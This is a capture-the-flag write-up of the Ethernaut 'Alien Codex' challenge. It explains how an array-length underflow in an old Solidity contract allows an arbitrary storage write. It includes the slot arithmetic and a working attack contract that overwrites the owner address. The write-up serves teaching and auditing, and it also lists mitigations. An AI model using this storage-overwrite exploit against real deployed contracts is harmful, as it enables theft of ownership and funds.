# Ethernaut #19 — Alien Codex

## Objective

Claim ownership of the `AlienCodex` contract.

## Vulnerability

**Integer underflow leading to arbitrary storage access.**

The contract uses Solidity `0.5.0`, which does not automatically check for arithmetic underflow. Its `retract()` function decrements the length of a dynamic array without checking whether the array is empty.

```solidity
function retract() contacted public {
    codex.length--;
}
```

When the array length is zero, decrementing it wraps the `uint256` value to `2²⁵⁶ - 1`. This makes an enormous range of array indices accessible, allowing an attacker to overwrite storage belonging to other state variables.

## Root Cause

The vulnerability combines two issues:

1. **Unchecked arithmetic:** Decrementing a zero-length array causes an integer underflow.
2. **Unrestricted array writes:** `revise()` permits writing to any index within the array's declared length.

```solidity
function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
}
```

Because the contract uses an old Solidity version, the underflow is not reverted. The attacker can manipulate the array's apparent bounds and use an out-of-range index relative to the original array contents to target another storage slot.

## Storage Layout

`AlienCodex` inherits from `Ownable`, which declares the `owner` variable.

| Storage slot | Contents |
|---|---|
| `0` | `owner` address and `contact` boolean, packed together |
| `1` | `codex.length` |
| `keccak256(1)` | First element of `codex` |
| `keccak256(1) + i` | Element `codex[i]`, modulo \(2^{256}\) |

A dynamic array stores its length at its assigned storage slot. Its elements begin at the hash of that slot.

For this challenge, the array data starts at:

\[
B=\operatorname{keccak256}(1)
\]

The storage slot of element `codex[i]` is:

\[
(B+i)\bmod 2^{256}
\]

The goal is to find an index that makes this expression equal to zero, where the `owner` variable is stored.

## Exploit Derivation

### 1. Enable the contract

Call `makeContact()` to set `contact` to `true`, satisfying the `contacted` modifier required by the vulnerable functions.

### 2. Trigger the underflow

Call `retract()` while the array length is zero.

Using unsigned 256-bit arithmetic:

$$
0 - 1 \equiv 2^{256} - 1 \pmod{2^{256}}
$$

The array length becomes the maximum `uint256` value, \(2^{256}-1\).

### 3. Calculate the target index

Let \(B\) be the base storage slot of the `codex` array:

$$
B = \operatorname{keccak256}(1)
$$

The storage slot of `codex[i]` is calculated as:

$$
\operatorname{slot}(i) = (B+i)\bmod 2^{256}
$$

We want this slot to wrap around to slot zero, where `owner` is stored:

$$
(B+i)\bmod 2^{256}=0
$$

Rearranging gives:

$$
i=(-B)\bmod 2^{256}
$$

Equivalently:

$$
i=(2^{256}-B)\bmod 2^{256}
$$

This index makes the array element's storage slot resolve to slot zero. Since \(B\) is nonzero, the resulting index is \(2^{256}-B\), which is within the underflowed array length \(2^{256}-1\).

### 4. Overwrite the owner

The `revise()` function writes a complete 32-byte storage word. The address must be encoded in the lower 20 bytes, leaving the upper 12 bytes zeroed.

The following attack contract uses the calculated index and an address encoded as `bytes32`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface AlienCodex {
    function revise(uint256, bytes32) external;
}

contract Attack {
    uint256 i =
        0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a;

    bytes32 value = bytes32(
        uint256(
            uint160(0x0C6c78a0aee50184b3eF605225a1c605A48e6144)
        )
    );

    function attack(AlienCodex target) external {
        target.revise(i, value);
    }
}
```

After `makeContact()` and `retract()` have been called on the target instance, invoke `attack()` with the instance address.

The write redirects the array element to storage slot zero, replacing the owner address with the chosen address.

Although `contact` shares that slot, the attack succeeds because `revise()` checks the `contacted` modifier before performing the write.

## Impact

An attacker can take ownership of the contract by overwriting its owner variable through a dynamic array write.

The underlying issue is an arbitrary storage write caused by unchecked arithmetic combined with insufficiently constrained array indexing.

## Mitigation

- Use Solidity `0.8.0` or later, where arithmetic overflow and underflow are checked by default.
- Explicitly validate array length before decrementing it.
- Avoid exposing array writes that can reach arbitrary storage locations.
- Review inherited storage layout and dynamic-array indexing during smart contract audits.

For example, the decrement should reject an empty array rather than allowing its length to wrap around.

## Verification

After executing the exploit, the browser console returned the expected owner address:

```javascript
await contract.owner();
```

```text
0x0C6c78a0aee50184b3eF605225a1c605A48e6144
```

**Result: Solved.**

## Key Takeaways

- Solidity storage layout includes inherited state variables.
- Dynamic arrays store their elements starting at `keccak256(p)`, where `p` is the slot containing the array length.
- Unchecked integer underflow can corrupt a dynamic array's apparent bounds.
- Storage-slot arithmetic wraps around modulo \(2^{256}\).
- A write through one variable can overwrite an unrelated variable when both resolve to the same storage slot.
